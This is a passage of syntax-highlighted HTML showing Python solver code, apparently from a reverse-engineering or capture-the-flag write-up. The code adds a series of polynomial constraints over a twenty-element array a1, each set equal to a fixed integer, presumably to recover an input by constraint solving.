data-num=\"18\"></td><td><pre><span class=\"token operator\">-</span> <span class=\"token number\">7</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token operator\">+</span> <span class=\"token number\">8</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token operator\">-</span> <span class=\"token number\">9</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token operator\">-</span> <span class=\"token number\">12</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token operator\">-</span> <span class=\"token number\">16</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">15</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token operator\">-</span> <span class=\"token number\">17</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token operator\">-</span> <span class=\"token number\">18</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">17</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">2582239</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token number\">20</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">19</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">19</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token operator\">+</span> <span class=\"token number\">14</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token operator\">+</span> <span class=\"token number\">13</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token operator\">+</span> <span class=\"token number\">11</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">10</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token operator\">+</span> <span class=\"token number\">30</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token operator\">-</span> <span class=\"token number\">7</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token operator\">+</span> <span class=\"token number\">8</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token operator\">-</span> <span class=\"token number\">9</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token operator\">+</span> <span class=\"token number\">5</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token operator\">+</span> <span class=\"token number\">3</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token operator\">+</span> <span class=\"token number\">2</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token operator\">-</span> <span class=\"token number\">4</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token operator\">-</span> <span class=\"token number\">12</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token operator\">-</span> <span class=\"token number\">16</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">15</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token operator\">-</span> <span class=\"token punctuation\">(</span><span class=\"token number\">18</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">17</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>       <span class=\"token operator\">+</span> <span class=\"token number\">17</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">2602741</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span><span class=\"token number\">19</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">18</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">17</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">14</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">13</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">12</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">11</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">9</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">7</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">30</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>     <span class=\"token operator\">+</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">2</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">4</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">3</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">5</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">8</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">10</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">15</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">17</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">16</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">20</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">19</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">2668123</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span><span class=\"token number\">20</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">19</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">19</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">14</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token number\">13</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">11</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">12</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token number\">10</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">30</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">5</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>     <span class=\"token operator\">+</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">2</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">3</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">4</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">7</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">8</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">9</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">16</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">15</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">17</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">18</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">17</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">2520193</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>    <span class=\"token number\">18</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">17</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>    <span class=\"token operator\">+</span> <span class=\"token number\">17</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>    <span class=\"token operator\">+</span> <span class=\"token number\">15</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>    <span class=\"token operator\">+</span> <span class=\"token number\">13</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">12</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>    <span class=\"token operator\">+</span> <span class=\"token number\">10</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>    <span class=\"token operator\">+</span> <span class=\"token number\">9</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">8</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>    <span class=\"token operator\">+</span> <span class=\"token number\">3</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">2</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>    <span class=\"token operator\">-</span> <span class=\"token number\">4</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>    <span class=\"token operator\">-</span> <span class=\"token number\">5</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>    <span class=\"token operator\">-</span> <span class=\"token number\">30</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>    <span class=\"token operator\">-</span> <span class=\"token number\">7</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>    <span class=\"token operator\">-</span> <span class=\"token number\">11</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>    <span class=\"token operator\">-</span> <span class=\"token number\">14</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>    <span class=\"token operator\">-</span> <span class=\"token number\">16</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>    <span class=\"token operator\">-</span> <span class=\"token number\">19</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>    <span class=\"token operator\">-</span> <span class=\"token number\">20</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">19</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">8904587</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>    <span class=\"token number\">18</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">17</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>    <span class=\"token operator\">+</span> <span class=\"token number\">7</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">30</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">5</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>    <span class=\"token operator\">+</span> <span class=\"token number\">4</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>    <span class=\"token operator\">+</span> <span class=\"token number\">8</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>    <span class=\"token operator\">+</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre><span class=\"token operator\">-</span> <span class=\"token number\">2</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre><span class=\"token operator\">-</span> <span class=\"token number\">3</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre><span class=\"token operator\">-</span> <span class=\"token number\">9</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre><span class=\"token operator\">-</span> <span class=\"token number\">11</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">10</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre><span class=\"token operator\">-</span> <span class=\"token number\">16</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token number\">13</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">12</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">14</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">15</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre><span class=\"token operator\">-</span> <span class=\"token number\">17</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre><span class=\"token operator\">-</span> <span class=\"token number\">19</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre><span class=\"token operator\">-</span> <span class=\"token number\">20</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">19</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">1227620874</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span><span class=\"token number\">20</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">19</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">19</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">17</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">14</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">13</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">12</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">11</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">10</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">7</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">30</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">5</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">3</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>     <span class=\"token operator\">+</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">2</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">4</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">8</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">9</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"116\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">16</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">15</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">18</span> <span 